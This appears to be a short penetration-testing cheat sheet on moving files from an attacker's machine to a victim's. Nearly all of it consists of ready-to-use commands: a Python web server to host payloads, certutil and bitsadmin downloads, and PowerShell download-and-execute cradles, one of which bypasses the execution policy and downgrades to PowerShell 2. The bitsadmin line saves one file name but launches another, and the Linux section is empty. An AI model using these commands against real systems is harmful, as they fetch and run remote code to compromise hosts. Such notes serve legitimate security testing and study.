#  Transferring Files

In many engagements you will need to be able to copy files between the victim machine and attacking machine.  This section outlines a number of common methods for transferring files for both Windows and Linux.  Note that this will usually rely on having the necessary files hosted on a webserver. This can be achieved by using python3 to create a temporary web server to host files on the attacker machine:
`python3 -m http.server 80`

## Windows 

### CertUtil.exe

CertUtil can be used to download files from a web server using the following command:

`certutil -urlcache -split -f "http://ip-addr:port/NameOfHostedFile" <output-file-name>`

### Powershell

Powershell can also be used to dowload and execute powershell scripts on a host:

`powershell IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')`

Powershell Download and Execute script with execution bypass and Powershell Version 2:

`powershell -Version 2 -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')`

### BITS Admin

`cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://<ip address>:<port>/FileToTransfer.exe C:\Path\ExeOutputName.exe & start acrev.exe"`


## Linux
